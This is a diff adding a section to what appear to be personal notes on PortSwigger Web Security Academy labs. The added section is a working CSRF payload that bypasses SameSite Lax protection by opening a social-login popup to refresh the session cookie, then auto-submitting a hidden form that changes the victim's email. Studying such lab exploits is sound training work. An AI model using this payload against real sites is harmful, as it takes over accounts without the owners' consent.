@@ -418,6 +418,22 @@ Our payload
 </script>
 ```
 
+ **SameSite Lax bypass via cookie refresh**
+
+Will bypass sso by opening up a popup window for our victim to change email
+```
+<form method="POST" action="https://0aea00c4046e2250803b4468000e001f.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="pwned@web-security-academy.net">
+</form>
+<script>
+    window.open('https://0aea00c4046e2250803b4468000e001f.web-security-academy.net/social-login');
+    setTimeout(changeEmail, 5000);
+
+    function changeEmail(){
+        document.forms[0].submit();
+    }
+</script>
+```
 
 
 
